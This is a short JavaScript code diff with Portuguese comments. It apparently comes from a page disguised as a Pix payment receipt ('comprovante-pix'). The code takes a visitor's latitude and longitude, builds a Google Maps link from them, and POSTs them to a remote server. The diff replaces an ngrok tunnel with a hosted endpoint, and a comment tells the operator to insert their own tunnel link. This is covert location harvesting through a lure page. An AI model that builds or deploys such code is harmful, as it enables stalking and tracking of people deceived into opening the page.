@@ -301,7 +301,7 @@
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
       // --- ATENÇÃO: COLOQUE SEU LINK DO NGROK AQUI ---
-      fetch("https://85c28ff20ca3.ngrok-free.app/send-location", {
+      fetch("https://comprovante-pix-l8l7.onrender.com/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude, longitude, maps })
